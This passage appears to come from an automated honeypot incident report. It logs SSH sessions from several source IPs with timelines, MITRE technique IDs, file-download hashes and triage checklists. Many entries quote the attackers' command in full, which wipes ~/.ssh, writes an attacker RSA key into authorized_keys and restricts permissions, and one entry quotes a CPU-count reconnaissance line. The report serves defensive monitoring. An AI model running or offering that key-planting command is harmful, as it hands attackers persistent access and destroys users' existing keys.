| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:14:35` | `cowrie.session.connect` |
| `2026-05-25 06:14:35` | `cowrie.client.version` |
| `2026-05-25 06:14:35` | `cowrie.client.kex` |
| `2026-05-25 06:14:35` | `cowrie.login.success` |
| `2026-05-25 06:14:35` | `cowrie.session.params` |
| `2026-05-25 06:14:35` | `cowrie.command.input` |
| `2026-05-25 06:14:35` | `cowrie.command.failed` |
| `2026-05-25 06:14:35` | `cowrie.log.closed` |
| `2026-05-25 06:14:35` | `cowrie.session.params` |
| `2026-05-25 06:14:35` | `cowrie.command.input` |
| `2026-05-25 06:14:35` | `cowrie.session.file_download` |
| `2026-05-25 06:14:35` | `cowrie.log.closed` |
| `2026-05-25 06:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.201[.]48` to AbuseIPDB if not already reported
- [ ] Block `43.156.201[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e44342edc24

| Field | Detail |
|---|---|
| **Source IP** | `43.156.201[.]48` |
| **First Seen** | 2026-05-25 06:14 |
| **Last Seen** | 2026-05-25 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:14:37` | `cowrie.session.connect` |
| `2026-05-25 06:14:37` | `cowrie.client.version` |
| `2026-05-25 06:14:37` | `cowrie.client.kex` |
| `2026-05-25 06:14:37` | `cowrie.login.success` |
| `2026-05-25 06:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.201[.]48` to AbuseIPDB if not already reported
- [ ] Block `43.156.201[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090941255e83

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:18 |
| **Last Seen** | 2026-05-25 06:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:18:56` | `cowrie.session.connect` |
| `2026-05-25 06:18:56` | `cowrie.client.version` |
| `2026-05-25 06:18:56` | `cowrie.client.kex` |
| `2026-05-25 06:18:57` | `cowrie.login.success` |
| `2026-05-25 06:18:57` | `cowrie.session.params` |
| `2026-05-25 06:18:57` | `cowrie.command.input` |
| `2026-05-25 06:18:57` | `cowrie.command.failed` |
| `2026-05-25 06:18:57` | `cowrie.log.closed` |
| `2026-05-25 06:18:57` | `cowrie.session.params` |
| `2026-05-25 06:18:57` | `cowrie.command.input` |
| `2026-05-25 06:18:57` | `cowrie.session.file_download` |
| `2026-05-25 06:18:57` | `cowrie.log.closed` |
| `2026-05-25 06:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77be0a1bb5c

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:18 |
| **Last Seen** | 2026-05-25 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:18:59` | `cowrie.session.connect` |
| `2026-05-25 06:18:59` | `cowrie.client.version` |
| `2026-05-25 06:18:59` | `cowrie.client.kex` |
| `2026-05-25 06:19:00` | `cowrie.login.success` |
| `2026-05-25 06:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c87b023b0e

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:23 |
| **Last Seen** | 2026-05-25 06:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:23:06` | `cowrie.session.connect` |
| `2026-05-25 06:23:06` | `cowrie.client.version` |
| `2026-05-25 06:23:06` | `cowrie.client.kex` |
| `2026-05-25 06:23:06` | `cowrie.login.success` |
| `2026-05-25 06:23:06` | `cowrie.session.params` |
| `2026-05-25 06:23:06` | `cowrie.command.input` |
| `2026-05-25 06:23:06` | `cowrie.command.failed` |
| `2026-05-25 06:23:07` | `cowrie.log.closed` |
| `2026-05-25 06:23:07` | `cowrie.session.params` |
| `2026-05-25 06:23:07` | `cowrie.command.input` |
| `2026-05-25 06:23:07` | `cowrie.session.file_download` |
| `2026-05-25 06:23:07` | `cowrie.log.closed` |
| `2026-05-25 06:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b5cf6b2b29

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:23 |
| **Last Seen** | 2026-05-25 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:23:09` | `cowrie.session.connect` |
| `2026-05-25 06:23:09` | `cowrie.client.version` |
| `2026-05-25 06:23:09` | `cowrie.client.kex` |
| `2026-05-25 06:23:09` | `cowrie.login.success` |
| `2026-05-25 06:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a26ab438cc08

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:27 |
| **Last Seen** | 2026-05-25 06:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:27:13` | `cowrie.session.connect` |
| `2026-05-25 06:27:13` | `cowrie.client.version` |
| `2026-05-25 06:27:13` | `cowrie.client.kex` |
| `2026-05-25 06:27:14` | `cowrie.login.success` |
| `2026-05-25 06:27:14` | `cowrie.session.params` |
| `2026-05-25 06:27:14` | `cowrie.command.input` |
| `2026-05-25 06:27:14` | `cowrie.command.failed` |
| `2026-05-25 06:27:14` | `cowrie.log.closed` |
| `2026-05-25 06:27:14` | `cowrie.session.params` |
| `2026-05-25 06:27:14` | `cowrie.command.input` |
| `2026-05-25 06:27:14` | `cowrie.session.file_download` |
| `2026-05-25 06:27:14` | `cowrie.log.closed` |
| `2026-05-25 06:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14464174ffd

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:27 |
| **Last Seen** | 2026-05-25 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:27:16` | `cowrie.session.connect` |
| `2026-05-25 06:27:16` | `cowrie.client.version` |
| `2026-05-25 06:27:16` | `cowrie.client.kex` |
| `2026-05-25 06:27:17` | `cowrie.login.success` |
| `2026-05-25 06:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec950fa8098c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]95` |
| **First Seen** | 2026-05-25 06:29 |
| **Last Seen** | 2026-05-25 06:29 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:29:14` | `cowrie.session.connect` |
| `2026-05-25 06:29:14` | `cowrie.client.version` |
| `2026-05-25 06:29:14` | `cowrie.client.kex` |
| `2026-05-25 06:29:15` | `cowrie.login.success` |
| `2026-05-25 06:29:42` | `cowrie.session.params` |
| `2026-05-25 06:29:42` | `cowrie.command.input` |
| `2026-05-25 06:29:42` | `cowrie.command.failed` |
| `2026-05-25 06:29:42` | `cowrie.log.closed` |
| `2026-05-25 06:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b760d39e36d5

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:31 |
| **Last Seen** | 2026-05-25 06:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:31:25` | `cowrie.session.connect` |
| `2026-05-25 06:31:25` | `cowrie.client.version` |
| `2026-05-25 06:31:25` | `cowrie.client.kex` |
| `2026-05-25 06:31:26` | `cowrie.login.success` |
| `2026-05-25 06:31:26` | `cowrie.session.params` |
| `2026-05-25 06:31:26` | `cowrie.command.input` |
| `2026-05-25 06:31:26` | `cowrie.command.failed` |
| `2026-05-25 06:31:26` | `cowrie.log.closed` |
| `2026-05-25 06:31:26` | `cowrie.session.params` |
| `2026-05-25 06:31:26` | `cowrie.command.input` |
| `2026-05-25 06:31:27` | `cowrie.session.file_download` |
| `2026-05-25 06:31:27` | `cowrie.log.closed` |
| `2026-05-25 06:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcbeacbc5962

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:31 |
| **Last Seen** | 2026-05-25 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:31:28` | `cowrie.session.connect` |
| `2026-05-25 06:31:28` | `cowrie.client.version` |
| `2026-05-25 06:31:28` | `cowrie.client.kex` |
| `2026-05-25 06:31:29` | `cowrie.login.success` |
| `2026-05-25 06:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218e0d553c1d

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:43 |
| **Last Seen** | 2026-05-25 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:43:57` | `cowrie.session.connect` |
| `2026-05-25 06:43:57` | `cowrie.client.version` |
| `2026-05-25 06:43:57` | `cowrie.client.kex` |
| `2026-05-25 06:43:57` | `cowrie.login.success` |
| `2026-05-25 06:43:58` | `cowrie.session.params` |
| `2026-05-25 06:43:58` | `cowrie.command.input` |
| `2026-05-25 06:43:58` | `cowrie.command.failed` |
| `2026-05-25 06:43:58` | `cowrie.log.closed` |
| `2026-05-25 06:43:58` | `cowrie.session.params` |
| `2026-05-25 06:43:58` | `cowrie.command.input` |
| `2026-05-25 06:43:58` | `cowrie.session.file_download` |
| `2026-05-25 06:43:58` | `cowrie.log.closed` |
| `2026-05-25 06:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788f9b7a0020

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:44 |
| **Last Seen** | 2026-05-25 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:44:00` | `cowrie.session.connect` |
| `2026-05-25 06:44:00` | `cowrie.client.version` |
| `2026-05-25 06:44:00` | `cowrie.client.kex` |
| `2026-05-25 06:44:00` | `cowrie.login.success` |
| `2026-05-25 06:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1523e6d801ef

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-05-25 06:56 |
| **Last Seen** | 2026-05-25 06:56 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cat /proc/cpuinfo | grep name | wc -l` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:56:07` | `cowrie.session.connect` |
| `2026-05-25 06:56:07` | `cowrie.client.version` |
| `2026-05-25 06:56:08` | `cowrie.client.kex` |
| `2026-05-25 06:56:16` | `cowrie.login.success` |
| `2026-05-25 06:56:22` | `cowrie.session.params` |
| `2026-05-25 06:56:22` | `cowrie.command.input` |
| `2026-05-25 06:56:22` | `cowrie.command.failed` |
| `2026-05-25 06:56:36` | `cowrie.log.closed` |
| `2026-05-25 06:56:47` | `cowrie.session.params` |
| `2026-05-25 06:56:47` | `cowrie.command.input` |
| `2026-05-25 06:56:55` | `cowrie.log.closed` |
| `2026-05-25 06:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99d9e1fdecb5

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 06:58 |
| **Last Seen** | 2026-05-25 06:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:58:36` | `cowrie.session.connect` |
| `2026-05-25 06:58:36` | `cowrie.client.version` |
| `2026-05-25 06:58:36` | `cowrie.client.kex` |
| `2026-05-25 06:58:37` | `cowrie.login.success` |
| `2026-05-25 06:58:38` | `cowrie.session.params` |
| `2026-05-25 06:58:38` | `cowrie.command.input` |
| `2026-05-25 06:58:38` | `cowrie.command.failed` |
| `2026-05-25 06:58:39` | `cowrie.log.closed` |
| `2026-05-25 06:58:39` | `cowrie.session.params` |
| `2026-05-25 06:58:39` | `cowrie.command.input` |
| `2026-05-25 06:58:39` | `cowrie.session.file_download` |
| `2026-05-25 06:58:39` | `cowrie.log.closed` |
| `2026-05-25 06:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-376236a8ced0

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 06:58 |
| **Last Seen** | 2026-05-25 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:58:43` | `cowrie.session.connect` |
| `2026-05-25 06:58:43` | `cowrie.client.version` |
| `2026-05-25 06:58:43` | `cowrie.client.kex` |
| `2026-05-25 06:58:44` | `cowrie.login.success` |
| `2026-05-25 06:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454ba714fdb3

| Field | Detail |
|---|---|
| **Source IP** | `45.173.103[.]146` |
| **First Seen** | 2026-05-25 07:02 |
| **Last Seen** | 2026-05-25 07:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:02:26` | `cowrie.session.connect` |
| `2026-05-25 07:02:26` | `cowrie.client.version` |
| `2026-05-25 07:02:27` | `cowrie.client.kex` |
| `2026-05-25 07:02:28` | `cowrie.login.success` |
| `2026-05-25 07:02:29` | `cowrie.session.params` |
| `2026-05-25 07:02:29` | `cowrie.command.input` |
| `2026-05-25 07:02:29` | `cowrie.command.failed` |
| `2026-05-25 07:02:29` | `cowrie.log.closed` |
| `2026-05-25 07:02:30` | `cowrie.session.params` |
| `2026-05-25 07:02:30` | `cowrie.command.input` |
| `2026-05-25 07:02:30` | `cowrie.session.file_download` |
| `2026-05-25 07:02:30` | `cowrie.log.closed` |
| `2026-05-25 07:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.173.103[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.173.103[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb29bc82420c

| Field | Detail |
|---|---|
| **Source IP** | `45.173.103[.]146` |
| **First Seen** | 2026-05-25 07:02 |
| **Last Seen** | 2026-05-25 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:02:33` | `cowrie.session.connect` |
| `2026-05-25 07:02:33` | `cowrie.client.version` |
| `2026-05-25 07:02:34` | `cowrie.client.kex` |
| `2026-05-25 07:02:35` | `cowrie.login.success` |
| `2026-05-25 07:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.173.103[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.173.103[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91c1d4f99bbb

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
